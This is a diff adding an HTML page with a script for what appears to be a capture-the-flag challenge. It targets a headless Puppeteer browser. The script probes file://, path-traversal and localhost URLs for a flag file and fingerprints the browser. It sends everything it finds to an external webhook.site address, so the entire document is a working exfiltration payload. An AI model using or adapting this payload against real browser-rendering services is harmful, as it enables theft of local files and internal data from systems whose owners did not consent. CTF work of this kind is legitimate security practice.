@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+<script>
+const webhook = 'https://webhook.site/bc26ecde-2e1b-4b01-af18-8d14d15de90f/';
+
+// Since we're in a controlled Puppeteer environment, try to exploit
+// the fact that this might be running with relaxed security
+
+function tryMultipleApproaches() {
+    // Approach 1: Try to read via fetch with various methods
+    const attempts = [
+        // Different potential paths
+        { method: 'fetch', url: '/flag.txt' },
+        { method: 'fetch', url: 'file:///flag.txt' },
+        { method: 'fetch', url: '../flag.txt' },
+        { method: 'fetch', url: '../../flag.txt' },
+        { method: 'fetch', url: '/home/user/../flag.txt' },
+        
+        // Try accessing localhost services that might expose the flag
+        { method: 'fetch', url: 'http://localhost:1338/flag' },
+        { method: 'fetch', url: 'http://127.0.0.1:1338/flag' },
+        { method: 'fetch', url: 'http://localhost/flag' },
+        { method: 'fetch', url: 'http://127.0.0.1/flag' },
+    ];
+    
+    let delay = 0;
+    attempts.forEach((attempt, index) => {
+        setTimeout(() => {
+            fetch(attempt.url)
+                .then(response => response.text())
+                .then(data => {
+                    if (data && data.trim() && data.includes('CTF{')) {
+                        // Found the flag!
+                        fetch(webhook + '?FOUND_FLAG=' + encodeURIComponent(data) + '&method=' + attempt.method + '&url=' + encodeURIComponent(attempt.url));
+                    } else if (data && data.trim()) {
+                        // Found some data, might be useful
+                        fetch(webhook + '?found_data=' + encodeURIComponent(data.substring(0, 200)) + '&method=' + attempt.method + '&url=' + encodeURIComponent(attempt.url));
+                    }
+                })
+                .catch(error => {
+                    // Most will fail, only report if interesting
+                    if (!error.message.includes('NetworkError') && !error.message.includes('Failed to fetch')) {
+                        fetch(webhook + '?error=' + encodeURIComponent(error.message) + '&method=' + attempt.method + '&url=' + encodeURIComponent(attempt.url));
+                    }
+                });
+        }, delay);
+        delay += 200; // Stagger requests
+    });
+}
+
+// Also try to read environment variables or other interesting info
+function tryEnvironmentInfo() {
+    setTimeout(() => {
+        // Send page location info
+        fetch(webhook + '?location_info=' + encodeURIComponent(window.location.href));
+        
+        // Try to access some properties that might give us info
+        const info = {
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform,
+            cookieEnabled: navigator.cookieEnabled,
+            onLine: navigator.onLine
+        };
+        
+        fetch(webhook + '?browser_info=' + encodeURIComponent(JSON.stringify(info)));
+    }, 500);
+}
+
+// Send start signal
+fetch(webhook + '?status=comprehensive_test_starting');
+
+// Execute attempts
+tryMultipleApproaches();
+tryEnvironmentInfo();
+
+// Keep trying for the full 10 seconds
+let attempts = 0;
+const intervalId = setInterval(() => {
+    attempts++;
+    
+    // Try current directory listing via different methods
+    fetch('./').then(r => r.text()).then(data => {
+        if (data.includes('flag')) {
+            fetch(webhook + '?directory_listing_success=' + encodeURIComponent(data));
+        }
+    }).catch(() => {});
+    
+    if (attempts >= 20) {
+        clearInterval(intervalId);
+        fetch(webhook + '?status=test_completed');
+    }
+}, 500);
+</script>
+<body>
+<p>Comprehensive flag extraction test</p>
+</body>
+</html>
